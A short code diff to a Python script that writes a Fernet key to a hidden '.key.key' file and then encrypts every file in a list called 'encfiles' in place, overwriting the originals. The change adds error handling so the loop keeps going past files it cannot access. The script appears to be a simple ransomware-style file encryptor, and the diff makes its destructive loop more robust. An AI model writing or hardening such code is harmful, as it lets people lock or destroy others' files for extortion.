@@ -24,9 +24,12 @@ with open('.key.key', "wb") as keyf:
     keyf.write(key)
 
 for file in encfiles:
-    with open(file, "rb") as f:
-        contents = f.read()
-    encrypted = Fernet(key).encrypt(contents)
+    try:
+        with open(file, "rb") as f:
+            contents = f.read()
+        encrypted = Fernet(key).encrypt(contents)
 
-    with open(file,"wb") as f:
-        f.write(encrypted)
+        with open(file,"wb") as f:
+            f.write(encrypted)
+    except:
+        print("can't access:", file)
